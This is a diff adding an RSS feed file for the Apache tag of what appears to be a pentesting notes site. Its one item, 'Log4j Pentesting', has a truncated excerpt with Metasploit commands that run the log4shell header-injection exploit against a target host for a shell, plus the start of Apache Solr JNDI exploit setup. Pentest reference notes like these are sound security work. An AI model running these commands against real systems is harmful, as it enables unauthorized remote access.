@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Apache on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/apache/</link>
+    <description>Recent content in Apache on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 14 Feb 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/apache/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Log4j Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</link>
+      <pubDate>Tue, 14 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/log4j-pentesting/</guid>
+      <description>msfconsole msf&amp;gt; use exploit/multi/http/log4shell_header_injection msf&amp;gt; set HTTP_HEADER ACCEPT msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set SRVHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set SRVPORT 1389 # e.g. Nagios msf&amp;gt; set TARGETURI /~logs msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; run shell Exploit Apache Solr (JNDI) linkYou need to prepare your four local terminals.&#xA;1. Start LDAP Server on Your Local Terminal 1 link Install Maven&#xA;sudo apt install maven Get the Payload&#xA;Download the repository.&#xA;git clone https://github.</description>
+    </item>
+  </channel>
+</rss>
